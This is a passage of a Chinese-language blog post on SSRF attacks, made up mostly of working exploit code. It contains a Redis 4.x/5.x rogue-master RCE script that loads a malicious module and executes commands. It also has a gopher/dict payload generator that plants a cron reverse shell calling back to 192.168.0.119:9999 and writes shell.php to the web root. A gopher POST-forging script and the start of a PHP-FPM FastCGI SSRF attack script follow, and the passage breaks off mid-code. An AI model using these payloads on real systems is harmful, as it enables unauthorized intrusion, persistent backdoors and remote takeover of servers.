class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">            logging.info(<span class="string">&quot;receive data: %r&quot;</span>, data)</span><br><span class="line">            arr = self.decode(data)</span><br><span class="line">            <span class="keyword">if</span> arr[<span class="number">0</span>].startswith(<span class="string">b&#x27;PING&#x27;</span>):</span><br><span class="line">                self.request.sendall(<span class="string">b&#x27;+PONG&#x27;</span> + DELIMITER)</span><br><span class="line">            <span class="keyword">elif</span> arr[<span class="number">0</span>].startswith(<span class="string">b&#x27;REPLCONF&#x27;</span>):</span><br><span class="line">                self.request.sendall(<span class="string">b&#x27;+OK&#x27;</span> + DELIMITER)</span><br><span class="line">            <span class="keyword">elif</span> arr[<span class="number">0</span>].startswith(<span class="string">b&#x27;PSYNC&#x27;</span>) <span class="keyword">or</span> arr[<span class="number">0</span>].startswith(<span class="string">b&#x27;SYNC&#x27;</span>):</span><br><span class="line">                self.request.sendall(<span class="string">b&#x27;+FULLRESYNC &#x27;</span> + <span class="string">b&#x27;Z&#x27;</span> * <span class="number">40</span> + <span class="string">b&#x27; 1&#x27;</span> + DELIMITER)</span><br><span class="line">                self.request.sendall(<span class="string">b&#x27;$&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(self.server.payload)).encode() + DELIMITER)</span><br><span class="line">                self.request.sendall(self.server.payload + DELIMITER)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        self.finish()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">finish</span>(<span class="params">self</span>):</span><br><span class="line">        self.request.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RoguoServer</span>(socketserver.TCPServer):</span><br><span class="line">    allow_reuse_address = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, server_address, payload</span>):</span><br><span class="line">        <span class="built_in">super</span>(RoguoServer, self).__init__(server_address, RoguoHandler, <span class="literal">True</span>)</span><br><span class="line">        self.payload = payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RedisClient</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, rhost, rport</span>):</span><br><span class="line">        self.client = socket.create_connection((rhost, rport), timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, data</span>):</span><br><span class="line">        data = self.encode(data)</span><br><span class="line">        self.client.send(data)</span><br><span class="line">        logging.info(<span class="string">&quot;send data: %r&quot;</span>, data)</span><br><span class="line">        <span class="keyword">return</span> self.recv()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recv</span>(<span class="params">self, count=<span class="number">65535</span></span>):</span><br><span class="line">        data = self.client.recv(count)</span><br><span class="line">        logging.info(<span class="string">&quot;receive data: %r&quot;</span>, data)</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">bytes</span>):</span><br><span class="line">            data = data.split()</span><br><span class="line"></span><br><span class="line">        args = [<span class="string">b&#x27;*&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(data)).encode()]</span><br><span class="line">        <span class="keyword">for</span> arg <span class="keyword">in</span> data:</span><br><span class="line">            args.extend([DELIMITER, <span class="string">b&#x27;$&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(arg)).encode(), DELIMITER, arg])</span><br><span class="line"></span><br><span class="line">        args.append(DELIMITER)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(args)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_command_line</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data.startswith(<span class="string">b&#x27;$&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> data.decode(errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    offset = data.find(DELIMITER)</span><br><span class="line">    size = <span class="built_in">int</span>(data[<span class="number">1</span>:offset])</span><br><span class="line">    offset += <span class="built_in">len</span>(DELIMITER)</span><br><span class="line">    data = data[offset:offset+size]</span><br><span class="line">    <span class="keyword">return</span> data.decode(errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">rhost, rport, lhost, lport, expfile, command, auth</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(expfile, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        server = RoguoServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, lport), f.read())</span><br><span class="line"></span><br><span class="line">    client = RedisClient(rhost, rport)</span><br><span class="line"></span><br><span class="line">    lhost = lhost.encode()</span><br><span class="line">    lport = <span class="built_in">str</span>(lport).encode()</span><br><span class="line">    command = command.encode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> auth:</span><br><span class="line">        client.send([<span class="string">b&#x27;AUTH&#x27;</span>, auth.encode()])</span><br><span class="line"></span><br><span class="line">    client.send([<span class="string">b&#x27;SLAVEOF&#x27;</span>, lhost, lport])</span><br><span class="line">    client.send([<span class="string">b&#x27;CONFIG&#x27;</span>, <span class="string">b&#x27;SET&#x27;</span>, <span class="string">b&#x27;dbfilename&#x27;</span>, <span class="string">b&#x27;exp.so&#x27;</span>])</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    server.handle_request()</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    client.send([<span class="string">b&#x27;MODULE&#x27;</span>, <span class="string">b&#x27;LOAD&#x27;</span>, <span class="string">b&#x27;./exp.so&#x27;</span>])</span><br><span class="line">    client.send([<span class="string">b&#x27;SLAVEOF&#x27;</span>, <span class="string">b&#x27;NO&#x27;</span>, <span class="string">b&#x27;ONE&#x27;</span>])</span><br><span class="line">    client.send([<span class="string">b&#x27;CONFIG&#x27;</span>, <span class="string">b&#x27;SET&#x27;</span>, <span class="string">b&#x27;dbfilename&#x27;</span>, <span class="string">b&#x27;dump.rdb&#x27;</span>])</span><br><span class="line">    resp = client.send([<span class="string">b&#x27;system.exec&#x27;</span>, command])</span><br><span class="line">    <span class="built_in">print</span>(decode_command_line(resp))</span><br><span class="line"></span><br><span class="line">    client.send([<span class="string">b&#x27;MODULE&#x27;</span>, <span class="string">b&#x27;UNLOAD&#x27;</span>, <span class="string">b&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Redis 4.x/5.x RCE with RedisModules&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-r&quot;</span>, <span class="string">&quot;--rhost&quot;</span>, dest=<span class="string">&quot;rhost&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;target host&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--rport&quot;</span>, dest=<span class="string">&quot;rport&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&quot;target redis port, default 6379&quot;</span>, default=<span class="number">6379</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-L&quot;</span>, <span class="string">&quot;--lhost&quot;</span>, dest=<span class="string">&quot;lhost&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&quot;rogue server ip&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-P&quot;</span>, <span class="string">&quot;--lport&quot;</span>, dest=<span class="string">&quot;lport&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&quot;rogue server listen port, default 21000&quot;</span>, default=<span class="number">21000</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--file&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;RedisModules to load, default exp.so&quot;</span>, default=<span class="string">&#x27;exp.so&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--command&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;Command that you want to execute&#x27;</span>, default=<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&quot;-a&quot;</span>, <span class="string">&quot;--auth&quot;</span>, dest=<span class="string">&quot;auth&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;redis password&quot;</span>)</span><br><span class="line">    options = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    filename = options.file</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">        logging.info(<span class="string">&quot;Where you module? &quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    exploit(options.rhost, options.rport, options.lhost, options.lport, filename, options.command, options.auth)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="Payload 生成"><a href="#Payload 生成" class="headerlink" title="Payload 生成"></a>Payload 生成 </h3><p> 通过 dict 或者 gophar 协议可以发送 redis 命令。</p><blockquote><p>注意：通过 dict 或者 gophar，有些特殊字符无法写入到 redis 中，需要转义。</p></blockquote><p>dict 与 gophar 协议格式生成：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="number">6379</span></span><br><span class="line">cmds = [</span><br><span class="line">    [<span class="string">&#x27;flushall&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;set x&#x27;</span>, <span class="string">&#x27;\\\\&quot;\\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/9999 0&gt;&amp;1\\n\\\\&quot;&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;config set dir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;config set dbfilename&#x27;</span>, <span class="string">&#x27;shell.php&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;save&#x27;</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dict_</span>(<span class="params">cmd</span>):</span><br><span class="line">    v = <span class="literal">None</span> <span class="keyword">if</span> <span class="built_in">len</span>(cmd) == <span class="number">1</span> <span class="keyword">else</span> cmd[<span class="number">1</span>]</span><br><span class="line">    cmd = <span class="string">&#x27;:&#x27;</span>.join(cmd[<span class="number">0</span>].split())</span><br><span class="line">    <span class="keyword">if</span> v:</span><br><span class="line">        cmd += <span class="string">&#x27;:&#x27;</span> + v</span><br><span class="line">    <span class="keyword">return</span> a2b_hex(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">hex</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:] <span class="keyword">for</span> c <span class="keyword">in</span> cmd))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gophar</span>(<span class="params">cmd</span>):</span><br><span class="line">    v = <span class="literal">None</span> <span class="keyword">if</span> <span class="built_in">len</span>(cmd) == <span class="number">1</span> <span class="keyword">else</span> cmd[<span class="number">1</span>]</span><br><span class="line">    cmd = cmd[<span class="number">0</span>].split()</span><br><span class="line">    <span class="keyword">if</span> v:</span><br><span class="line">        cmd.append(v)</span><br><span class="line">    result = <span class="string">&#x27;*%d\r\n&#x27;</span> % <span class="built_in">len</span>(cmd)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        result += <span class="string">&#x27;$%d\r\n%s\r\n&#x27;</span> % (<span class="built_in">len</span>(c), c)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> cmds:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;dict://%s:%d/%s&#x27;</span> % (ip, port, quote(dict_(cmd), <span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(</span><br><span class="line">    <span class="string">&#x27;gopher://%s:%d/_%s&#x27;</span> % (</span><br><span class="line">        ip, port,</span><br><span class="line">        quote(<span class="string">&#x27;&#x27;</span>.join((gophar(cmd) <span class="keyword">for</span> cmd <span class="keyword">in</span> cmds)), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="伪造 POST"><a href="# 伪造 POST" class="headerlink" title="伪造 POST"></a>伪造 POST</h2><p>利用 gophar 协议可以发送 POST 请求。</p><blockquote><p>注意：修改 Content-Length 以及 data 的 url 编码。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">path = <span class="string">&#x27;/index.php&#x27;</span></span><br><span class="line">headers = [</span><br><span class="line">    <span class="string">&#x27;User-Agent: curl/7.43.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept: */*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Length: 0&#x27;</span></span><br><span class="line">]</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;gopher://%s:%d/_%s&#x27;</span> % (ip, port, quote(<span class="string">&#x27;POST %s HTTP/1.1\r\nHost: %s\r\n%s\r\n\r\n%s&#x27;</span> % (path, ip, <span class="string">&#x27;\r\n&#x27;</span>.join(headers), data))))</span><br></pre></td></tr></table></figure><blockquote><p>实际上，gophar 协议可以发送任何 TCP 数据包。</p></blockquote><h2 id="攻击 FPM"><a href="# 攻击 FPM" class="headerlink" title="攻击 FPM"></a>攻击 FPM</h2><p>大部分情况下 fpm 运行在内网 9000 端口，<code>dict://127.0.0.1:9000/</code>。利用 SSRF 的攻击脚本如下，例如<code>python fpm_ssrf.py -c &#39;&lt;?php system(&quot;id&quot;);exit;?&gt;&#39; -p 9000 127.0.0.1 /usr/local/lib/php/PEAR.php</code>，注意需要的值一个在服务器中绝对路径的 php 文件，返回 gophar 协议编码的 paylaod。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bchr</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(<span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([i])</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bord</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(c, <span class="built_in">int</span>):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ord</span>(c)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force_bytes</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force_text</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">issubclass</span>(<span class="built_in">type</span>(s), <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        s = <span class="built_in">str</span>(s, <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="built_in">str</span>(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FastCGIClient</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"> </span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"> </span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, host, port, timeout, keepalive</span>):</span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = <span class="built_in">dict</span>()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__connect</span>(<span class="params">self</span>):</span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, <span class="built_in">int</span>(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">repr</span>(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span 